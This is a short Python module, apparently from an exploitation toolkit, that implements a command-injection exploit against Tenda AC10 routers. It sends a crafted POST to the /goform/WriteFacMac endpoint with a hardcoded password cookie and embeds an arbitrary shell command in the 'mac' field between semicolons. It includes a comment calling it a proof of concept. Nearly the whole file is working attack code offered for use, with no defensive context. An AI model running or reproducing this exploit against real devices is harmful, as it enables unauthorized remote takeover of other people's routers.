#! python !#
from misc.session import *
import urllib.parse

def tenda_ac10(ip, cmd, session):
    try:
        #encode command as url
        command = urllib.parse.quote_plus(cmd)
        command.replace(' ', '${IFS}')
        
        cookies = {
            'password': 'cnqcvb',
        }

        headers = {
            'Accept': 'text/plain, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',
            'Referer': f'http://{ip}/main.html',
            'X-Requested-with': 'XMLHttpRequest',
            # 'Cookie': 'password=cnqcvb',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Applewebkit/537.36 (KHTML, like Gecko) chrome/91.0.4472. 114 Safari/537.36',
        }

        data = f'mac=;{command};'

        response = session.post(f'https://{ip}/goform/WriteFacMac', headers=headers, cookies=cookies, data=data, timeout=(5,3))
        return True
    except Exception as e: return (False, e)

# PoC example:
# Converted using
# https://curl.se/h2c/ - raw to curl
# https://curlconverter.com/ - curl to python
#
# request built from code below